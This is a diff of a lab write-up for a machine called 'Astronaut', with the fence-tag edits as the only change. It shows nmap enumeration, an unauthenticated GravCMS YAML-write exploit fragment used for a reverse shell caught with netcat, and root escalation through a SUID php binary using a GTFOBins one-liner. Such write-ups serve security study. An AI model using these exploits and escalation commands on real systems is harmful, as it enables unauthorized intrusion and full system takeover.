@@ -3,7 +3,7 @@
 # 🐧Astronaut🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.156.12 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 16:55 AEDT
 Nmap scan report for 192.168.156.12
@@ -17,7 +17,7 @@ The web is running Grav
 searchsploit found one python script for Arbitrary YAML Write/Update  
 it doesn't require login  
 https://www.exploit-db.com/exploits/49973
-```
+```console
 # Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
 # Original Exploit Author: Mehmet Ince
 # Vendor Homepage: https://getgrav.org
@@ -48,10 +48,10 @@ if adminNonce != "" :
     r = s.post(target+"/admin/config/scheduler",data=data,headers=headers)
 ```
 change the the target and ip to get the shell back
-```
+```console
 $ python3 49973.py
 ```
-```
+```console
 $ nc -lvnp 4444              
 listening on [any] 4444 ...
 connect to [192.168.45.231] from (UNKNOWN) [192.168.156.12] 45620
@@ -63,16 +63,16 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 ## Privilege Escalation  
 search for SUID bit and found php
-```
+```console
 $ find / -perm -4000 -type f 2>/dev/null
 /usr/bin/php7.4
 ```
 From gtfobin, we can get root if php running with suid bit  
 https://gtfobins.org/gtfobins/php/
-```
+```console
 php -r "pcntl_exec('/bin/bash', ['-p']);"
 ```
-```
+```console
 /usr/bin/php7.4 -r "pcntl_exec('/bin/bash', ['-p']);"
 id
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
